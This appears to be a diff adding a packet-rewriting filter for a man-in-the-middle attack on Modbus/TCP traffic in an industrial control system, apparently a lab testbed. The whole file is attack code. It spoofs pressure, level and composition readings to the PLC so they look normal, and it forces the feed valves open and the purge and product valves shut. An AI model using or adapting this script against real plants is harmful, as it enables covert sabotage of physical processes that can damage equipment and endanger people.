@@ -1,0 +1,54 @@
+# intercept from pressure/level/composition and manipulate sensor readings to normal levels
+# intercept from plc to actuators to:
+#    - close purge and product
+#    - open f1 and f2
+
+# pressure/level to plc
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0xd7;
+        DATA.data + 10 = 0xff;
+        DATA.data + 11 = 0x70;
+        DATA.data + 12 = 0xa3;
+    }
+}
+
+# composition to plc
+if (ip.src == '192.168.95.15' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0x78;
+        DATA.data + 10 = 0x51;
+    }
+}
+
+# plc to feed 1
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.10') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
+# plc to feed 2
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.11') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
+# plc to purge
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.12') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0x00;
+        DATA.data + 14 = 0x00;
+    }
+}
+
+# plc to product
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.13') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0x00;
+        DATA.data + 14 = 0x00;
+    }
+}
